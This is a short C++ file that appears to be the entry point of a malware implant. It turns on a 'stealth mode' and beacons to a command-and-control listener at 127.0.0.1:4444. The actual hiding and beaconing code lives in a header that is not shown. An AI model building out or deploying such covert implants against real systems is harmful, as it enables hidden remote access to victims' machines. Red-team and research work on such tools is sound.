// main_implant.cpp
#include "client.h"

int main() {
    ImplantUtils::stealth_mode();
    
    try {
        BasicImplant implant("127.0.0.1", 4444);
        implant.beacon();
    } catch (const exception& e) {
        cerr << "Implant error: " << e.what() << endl;
        return 1;
    }
    
    return 0;
}